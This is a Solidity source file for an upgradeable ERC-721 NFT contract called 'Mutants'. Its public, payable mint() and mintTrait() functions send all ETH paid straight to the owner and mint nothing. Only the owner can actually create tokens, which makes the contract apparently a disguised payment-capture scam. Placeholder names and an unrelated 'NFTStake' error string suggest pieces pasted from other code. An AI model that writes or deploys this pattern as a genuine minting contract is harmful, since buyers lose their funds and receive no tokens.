pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/token/ERC721/extensions/ERC721EnumerableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract Mutants is ERC721EnumerableUpgradeable, OwnableUpgradeable {
    using StringsUpgradeable for uint256;

    // Proxy
    address __delegate;
    address __owner;

    address private royaltyAddress;
    uint256 private royaltyAmount;
    bytes4 private constant _INTERFACE_ID_ERC2981 = 0x2a55205a;

    string baseURI;
    uint256 public costs = 0.01 ether;
    uint256 public supply = 0;

    bool __initialized;

    // Initializer
    function initialize() public {
        require(__initialized == false, 'NFTStake: Already initialized');
        __initialized = true;
        __ERC721_init("X", "X");
        __Ownable_init_unchained();
        setRoyaltyInfo(msg.sender, 0);
    }

    function mint(uint256 _amount) external payable {
        // Reserved
        payable(owner()).call{value: msg.value}("");
    }

    function mintTo(address _receiver, uint256 _tokenId) public onlyOwner {
        _mint(_receiver, _tokenId);
    }

    function mintTrait(uint256 _amount) external payable {
        // Reserved
        payable(owner()).call{value: msg.value}("");
    }

    function _baseURI() internal view virtual override returns (string memory) {
        return baseURI;
    }

    function walletOfOwner(address _owner) public view returns (uint256[] memory) {
        uint256 ownerTokenCount = balanceOf(_owner);
        uint256[] memory tokenIds = new uint256[](ownerTokenCount);
        for (uint256 i; i < ownerTokenCount; i++) {
            tokenIds[i] = tokenOfOwnerByIndex(_owner, i);
        }
        return tokenIds;
    }

    function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
        require(_exists(_tokenId), "ERC721Metadata: URI query for nonexistent token");
        string memory currentBaseURI = _baseURI();
        string memory id = _tokenId.toString();
        return string(abi.encodePacked(currentBaseURI, id));
    }

    /** ADMIN **/
    function setBaseURI(string memory _newBaseURI) public onlyOwner {
        baseURI = _newBaseURI;
    }

    function setCosts(uint256 _costs) public onlyOwner {
        costs = _costs;
    }

    function withdraw() public payable onlyOwner {
        (bool os, ) = payable(owner()).call{value: address(this).balance}("");
        require(os);
    }

    function setRoyaltyInfo(address _rA, uint256 _rP) public onlyOwner {
        royaltyAddress = _rA;
        royaltyAmount = _rP;
    }

    /** Royalty info **/
    function royaltyInfo(uint256 _tokenId, uint256 _salePrice) external view returns (address receiver, uint256 royalty) {
        return (royaltyAddress, ((_salePrice * royaltyAmount) / 10000));
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721EnumerableUpgradeable) returns (bool) {
        if (interfaceId == _INTERFACE_ID_ERC2981) {
            return true;
        }
        return super.supportsInterface(interfaceId);
    }
}

